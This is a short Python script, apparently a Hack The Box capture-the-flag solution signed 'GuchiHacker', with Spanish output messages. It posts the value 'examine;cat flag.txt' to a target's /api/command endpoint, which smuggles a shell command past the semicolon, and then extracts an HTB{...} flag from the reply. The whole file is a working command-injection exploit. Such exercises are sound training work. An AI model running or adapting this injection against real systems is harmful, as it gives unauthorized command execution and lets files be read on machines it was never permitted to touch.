# By GuchiHacker

import sys
import requests
import json
import re

def get_flag(target):
    try:
        ip, port = target.split(":")
        url = f"http://{ip}:{port}/api/command"
        
        headers = {
            "Content-Type": "application/json"
        }
        
        payload = {"command": "examine;cat flag.txt"}
        
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        response.raise_for_status() 
        
        data = response.json()
        
        if data.get("success"):
            output = data.get("output", "")
            
            flag_match = re.search(r'HTB\{.*?\}', output)
            if flag_match:
                print("Flag encontrada:", flag_match.group(0))
            else:
                print("No se encontr√≥ la flag en la respuesta.")
        else:
            print("Error: No se pudo ejecutar el comando.")
    
    except Exception as e:
        print("Error:", str(e))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python {sys.argv[0]} <IP:PUERTO>")
    else:
        get_flag(sys.argv[1])

